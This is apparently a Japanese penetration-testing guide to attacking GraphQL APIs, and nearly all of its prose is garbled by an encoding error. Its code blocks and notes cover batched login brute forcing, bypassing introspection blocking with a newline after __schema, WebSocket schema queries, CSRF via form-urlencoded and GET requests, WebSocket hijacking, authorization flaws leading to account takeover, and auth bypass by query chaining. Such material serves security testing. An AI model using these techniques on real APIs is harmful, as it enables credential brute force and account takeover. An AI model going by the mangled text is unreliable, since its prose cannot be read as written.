**ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã‚µãƒ¼ãƒãƒ¼å´ã§å¤‰æ›´ã‚’åŠ ãˆã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚**

**ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³**ã§ã¯ã€**å®£è¨€ã•ã‚ŒãŸ** **ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®ç”»åƒã§ã¯ã€"_MutationType_"ã¯"_Mutation_"ã¨å‘¼ã°ã‚Œã€"_Mutation_"ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®åå‰ï¼ˆã“ã®å ´åˆã¯"_addPerson_"ã®ã‚ˆã†ã«ï¼‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼š

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

ã“ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã§ã¯ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã«ã¯**äººç‰©**ã¨**æ˜ ç”»**ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚**äººç‰©**ã¯ãã®**ãƒ¡ãƒ¼ãƒ«**ã¨**åå‰**ã§è­˜åˆ¥ã•ã‚Œã€**æ˜ ç”»**ã¯ãã®**åå‰**ã¨**è©•ä¾¡**ã§è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚**äººç‰©**ã¯äº’ã„ã«å‹é”ã«ãªã‚Šã€æ˜ ç”»ã‚’æŒã¤ã“ã¨ã‚‚ã§ãã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®é–¢ä¿‚ã‚’ç¤ºã—ã¾ã™ã€‚

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã«**æ–°ã—ã„**æ˜ ç”»ã‚’**ä½œæˆã™ã‚‹**ãŸã‚ã®ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼ˆã“ã®ä¾‹ã§ã¯ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã¯`addMovie`ã¨å‘¼ã°ã‚Œã¾ã™ï¼‰ï¼š
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**ã‚¯ã‚¨ãƒªå†…ã§å€¤ã¨ãƒ‡ãƒ¼ã‚¿ã®å‹ãŒã©ã®ã‚ˆã†ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‹ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**

ã•ã‚‰ã«ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€æ—¢å­˜ã®**å‹äºº**ã‚„**æ˜ ç”»**ã¨ã®é–¢é€£ã‚’æŒã¤**äººç‰©**ã®ä½œæˆã‚’å¯èƒ½ã«ã™ã‚‹`addPerson`ã¨ã„ã†åå‰ã®**ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**æ“ä½œã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚æ–°ã—ãä½œæˆã•ã‚ŒãŸäººç‰©ã«ãƒªãƒ³ã‚¯ã™ã‚‹å‰ã«ã€å‹äººã¨æ˜ ç”»ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å­˜åœ¨ã—ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ­ãƒ¼ãƒ‰

[**ã“ã®ãƒ¬ãƒãƒ¼ãƒˆã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹è„†å¼±æ€§ã®1ã¤**](https://www.landh.tech/blog/20240304-google-hack-50000/)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ­ãƒ¼ãƒ‰ã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒæ“ä½œã‚’ç„¡é§„ã«ã™ã‚‹ã¾ã§ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ä½•ç™¾ä¸‡å›ã‚‚å‘¼ã³å‡ºã™ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

### 1ã¤ã®APIãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã®ãƒãƒƒãƒãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®æƒ…å ±ã¯[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)ã‹ã‚‰å–å¾—ã•ã‚Œã¾ã—ãŸã€‚\
**ç•°ãªã‚‹èªè¨¼æƒ…å ±ã§å¤šãã®ã‚¯ã‚¨ãƒªã‚’åŒæ™‚ã«é€ä¿¡ã™ã‚‹**ã“ã¨ã§GraphQL APIã‚’é€šã˜ã¦èªè¨¼ã‚’è¡Œã„ã¾ã™ã€‚ã“ã‚Œã¯å¤å…¸çš„ãªãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã§ã™ãŒã€GraphQLã®ãƒãƒƒãƒæ©Ÿèƒ½ã®ãŠã‹ã’ã§ã€HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã”ã¨ã«1ã¤ä»¥ä¸Šã®ãƒ­ã‚°ã‚¤ãƒ³/ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒšã‚¢ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã—ãŸã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€å¤–éƒ¨ã®ãƒ¬ãƒ¼ãƒˆç›£è¦–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ¬ºã„ã¦ã€ã™ã¹ã¦ãŒæ­£å¸¸ã§ã‚ã‚Šã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¨æ¸¬ã—ã‚ˆã†ã¨ã™ã‚‹ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ãƒœãƒƒãƒˆãŒã„ãªã„ã¨è€ƒãˆã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€**åŒæ™‚ã«3ã¤ã®ç•°ãªã‚‹ãƒ¡ãƒ¼ãƒ«/ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒšã‚¢**ã‚’ä½¿ç”¨ã—ãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³èªè¨¼ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æœ€ã‚‚ç°¡å˜ãªãƒ‡ãƒ¢ã§ã™ã€‚æ˜ã‚‰ã‹ã«ã€åŒã˜æ–¹æ³•ã§1å›ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§æ•°åƒã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š

![](<../../.gitbook/assets/image (1081).png>)

ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆã‹ã‚‰ã‚ã‹ã‚‹ã‚ˆã†ã«ã€æœ€åˆã¨3ç•ªç›®ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯_null_ã‚’è¿”ã—ã€_error_ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«å¯¾å¿œã™ã‚‹æƒ…å ±ã‚’åæ˜ ã—ã¾ã—ãŸã€‚**2ç•ªç›®ã®ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã¯æ­£ã—ã„èªè¨¼**ãƒ‡ãƒ¼ã‚¿ã‚’æŒã¡ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯æ­£ã—ã„èªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒˆãƒ¼ã‚¯ãƒ³ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

![](<../../.gitbook/assets/image (119) (1).png>)

## ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ãªã—ã®GraphQL

ã¾ã™ã¾ã™å¤šãã®**graphqlã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚’ç„¡åŠ¹ã«ã—ã¦ã„ã¾ã™**ã€‚ã—ã‹ã—ã€äºˆæœŸã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå—ä¿¡ã•ã‚ŒãŸã¨ãã«graphqlãŒæŠ•ã’ã‚‹ã‚¨ãƒ©ãƒ¼ã¯ã€[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)ã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ãŒã‚¹ã‚­ãƒ¼ãƒã®å¤§éƒ¨åˆ†ã‚’å†æ§‹ç¯‰ã™ã‚‹ã®ã«ååˆ†ã§ã™ã€‚

ã•ã‚‰ã«ã€Burp Suiteæ‹¡å¼µæ©Ÿèƒ½[**GraphQuail**](https://github.com/forcesunseen/graphquail)ã¯ã€**Burpã‚’é€šéã™ã‚‹GraphQL APIãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¦³å¯Ÿã—**ã€**æ–°ã—ã„ã‚¯ã‚¨ãƒªã‚’è¦‹ã‚‹ãŸã³ã«**å†…éƒ¨GraphQL **ã‚¹ã‚­ãƒ¼ãƒ**ã‚’æ§‹ç¯‰ã—ã¾ã™ã€‚ã¾ãŸã€GraphiQLã‚„Voyagerç”¨ã«ã‚¹ã‚­ãƒ¼ãƒã‚’å…¬é–‹ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã®æ‹¡å¼µæ©Ÿèƒ½ã¯ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒªã‚’å—ä¿¡ã—ãŸã¨ãã«å½ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’è¿”ã—ã¾ã™ã€‚ãã®çµæœã€GraphQuailã¯APIå†…ã§ä½¿ç”¨å¯èƒ½ãªã™ã¹ã¦ã®ã‚¯ã‚¨ãƒªã€å¼•æ•°ã€ãŠã‚ˆã³ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯[**ã“ã¡ã‚‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)ã€‚

ç´ æ™´ã‚‰ã—ã„**ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ**ã¯ã€[**GraphQLã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«ã“ã“ã«ã‚ã‚Šã¾ã™**](https://github.com/Escape-Technologies/graphql-wordlist?)ã€‚

### GraphQLã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³é˜²å¾¡ã®å›é¿ <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

APIã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒªã«å¯¾ã™ã‚‹åˆ¶é™ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€**`__schema`ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã®å¾Œã«ç‰¹åˆ¥ãªæ–‡å­—ã‚’æŒ¿å…¥ã™ã‚‹**ã“ã¨ãŒåŠ¹æœçš„ã§ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã“ã¨ã‚’ç›®çš„ã¨ã—ãŸæ­£è¦è¡¨ç¾ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ãŠã‘ã‚‹ä¸€èˆ¬çš„ãªé–‹ç™ºè€…ã®è¦‹è½ã¨ã—ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚GraphQLãŒç„¡è¦–ã™ã‚‹ãŒæ­£è¦è¡¨ç¾ã§ã¯è€ƒæ…®ã•ã‚Œãªã„å¯èƒ½æ€§ã®ã‚ã‚‹**ã‚¹ãƒšãƒ¼ã‚¹ã€æ”¹è¡Œã€ã‚«ãƒ³ãƒ**ã®ã‚ˆã†ãªæ–‡å­—ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€åˆ¶é™ã‚’å›é¿ã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€`__schema`ã®å¾Œã«æ”¹è¡Œã‚’å«ã‚€ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒªã¯ã€ãã®ã‚ˆã†ãªé˜²å¾¡ã‚’å›é¿ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
æˆåŠŸã—ãªã„å ´åˆã¯ã€**GETãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚„**`x-www-form-urlencoded`ã‚’ä½¿ç”¨ã—ãŸPOST**ãªã©ã®ä»£æ›¿ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ–¹æ³•ã‚’æ¤œè¨ã—ã¦ãã ã•ã„ã€‚åˆ¶é™ãŒPOSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã¿ã«é©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### WebSocketsã‚’è©¦ã™

[**ã“ã®ãƒˆãƒ¼ã‚¯**](https://www.youtube.com/watch?v=tIo\_t5uUK50)ã§è¿°ã¹ãŸã‚ˆã†ã«ã€WebSocketsã‚’ä»‹ã—ã¦graphQLã«æ¥ç¶šã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ½œåœ¨çš„ãªWAFã‚’å›é¿ã—ã€WebSocketé€šä¿¡ãŒgraphQLã®ã‚¹ã‚­ãƒ¼ãƒã‚’æ¼æ´©ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **éœ²å‡ºã—ãŸGraphQLæ§‹é€ ã®ç™ºè¦‹**

ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã§èª¿ã¹ã‚‹ã“ã¨ã¯æœ‰åŠ¹ãªæˆ¦ç•¥ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¯ã‚¨ãƒªã¯ã€é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã®`Sources`ã‚¿ãƒ–ã‚’ä½¿ç”¨ã—ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€APIã®ã‚¹ã‚­ãƒ¼ãƒã«é–¢ã™ã‚‹æ´å¯Ÿã‚’æä¾›ã—ã€æ½œåœ¨çš„ã«**éœ²å‡ºã—ãŸæ©Ÿå¯†ã‚¯ã‚¨ãƒª**ã‚’æ˜ã‚‰ã‹ã«ã—ã¾ã™ã€‚é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«å†…ã§æ¤œç´¢ã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLã«ãŠã‘ã‚‹CSRF

CSRFãŒä½•ã‹åˆ†ã‹ã‚‰ãªã„å ´åˆã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§ãã ã•ã„ï¼š

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

å¤–ã«ã¯ã€**CSRFãƒˆãƒ¼ã‚¯ãƒ³ãªã—ã§æ§‹æˆã•ã‚ŒãŸ**ã„ãã¤ã‹ã®GraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã§ã—ã‚‡ã†ã€‚

GraphQLãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯é€šå¸¸ã€Content-Type **`application/json`**ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã§é€ä¿¡ã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
ã—ã‹ã—ã€ã»ã¨ã‚“ã©ã®GraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯**`form-urlencoded` POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚‚ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
ã—ãŸãŒã£ã¦ã€å‰è¿°ã®ã‚ˆã†ãªCSRFãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯**ãƒ—ãƒ¬ãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãªã—ã§é€ä¿¡ã•ã‚Œã‚‹**ãŸã‚ã€CSRFã‚’æ‚ªç”¨ã—ã¦GraphQLã«**å¤‰æ›´**ã‚’**åŠ ãˆã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ãŸã ã—ã€Chromeã®`samesite`ãƒ•ãƒ©ã‚°ã®æ–°ã—ã„ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚¯ãƒƒã‚­ãƒ¼å€¤ã¯`Lax`ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€ã‚¯ãƒƒã‚­ãƒ¼ãŒGETãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã®ã¿ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®ã‚¦ã‚§ãƒ–ã‹ã‚‰é€ä¿¡ã•ã‚Œã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

**ã‚¯ã‚¨ãƒª** **ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’**GET** **ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã¨ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚é€šå¸¸å¯èƒ½ã§ã‚ã‚Šã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã¯CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒæ¤œè¨¼ã•ã‚Œãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã¾ãŸã€[**XS-Search**](../../pentesting-web/xs-search/) **æ”»æ’ƒ**ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’åˆ©ç”¨ã—ã¦GraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã¡ã‚‰ã®å…ƒã®æŠ•ç¨¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)ã€‚

## GraphQLã«ãŠã‘ã‚‹ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆWebSocketãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯

GraphQLã‚’æ‚ªç”¨ã™ã‚‹CRSFè„†å¼±æ€§ã¨åŒæ§˜ã«ã€**ä¿è­·ã•ã‚Œã¦ã„ãªã„ã‚¯ãƒƒã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦GraphQLã§ã®èªè¨¼ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆWebSocketãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒGraphQLã§äºˆæœŸã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## GraphQLã«ãŠã‘ã‚‹èªå¯

ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§å®šç¾©ã•ã‚ŒãŸå¤šãã®GraphQLé–¢æ•°ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ã‚¿ãƒ¼ã®èªè¨¼ã®ã¿ã‚’ç¢ºèªã—ã€èªå¯ã¯ç¢ºèªã—ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ã‚¯ã‚¨ãƒªå…¥åŠ›å¤‰æ•°ã‚’å¤‰æ›´ã™ã‚‹ã¨ã€æ©Ÿå¯†ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è©³ç´°ãŒ[æ¼æ´©](https://hackerone.com/reports/792927)ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ä¹—ã£å–ã‚Šã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLã«ãŠã‘ã‚‹èªè¨¼ã®ãƒã‚¤ãƒ‘ã‚¹

[ã‚¯ã‚¨ãƒªã®ãƒã‚§ãƒ¼ãƒ‹ãƒ³ã‚°](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)ã‚’è¡Œã†ã“ã¨ã§ã€å¼±ã„èªè¨¼ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚

ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€æ“ä½œãŒã€ŒforgotPasswordã€ã§ã‚ã‚Šã€ãã‚Œã«é–¢é€£ã™ã‚‹forgotPasswordã‚¯ã‚¨ãƒªã®ã¿ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã«ã¯ã€æœ€å¾Œã«ã‚¯ã‚¨ãƒªã‚’è¿½åŠ ã—ã¾ã™ã€‚ã“ã®å ´åˆã€ã€Œregisterã€ã¨æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã‚·ã‚¹ãƒ†ãƒ ã«ç™»éŒ²ã™ã‚‹ãŸã‚ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å¤‰æ•°ã‚’è¿½åŠ ã—ã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQLã«ãŠã‘ã‚‹ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’ä½¿ç”¨ã—ãŸãƒ¬ãƒ¼ãƒˆåˆ¶é™ã®ãƒã‚¤ãƒ‘ã‚¹

GraphQLã§ã¯ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã¯APIãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†éš›ã«**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®åå‰ã‚’æ˜ç¤ºçš„ã«æŒ‡å®šã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹å¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ã€**åŒã˜ã‚¿ã‚¤ãƒ—**ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**è¤‡æ•°ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹**ã‚’å˜ä¸€ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§å–å¾—ã™ã‚‹ã®ã«ç‰¹ã«ä¾¿åˆ©ã§ã™ã€‚ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€GraphQLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒåŒã˜åå‰ã®è¤‡æ•°ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’æŒã¤ã“ã¨ã‚’å¦¨ã’ã‚‹åˆ¶é™ã‚’å…‹æœã§ãã¾ã™ã€‚

GraphQLã‚¨ã‚¤ãƒªã‚¢ã‚¹ã®è©³ç´°ãªç†è§£ã®ãŸã‚ã«ã€ä»¥ä¸‹ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¨å¥¨ã—ã¾ã™: [ã‚¨ã‚¤ãƒªã‚¢ã‚¹](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)ã€‚

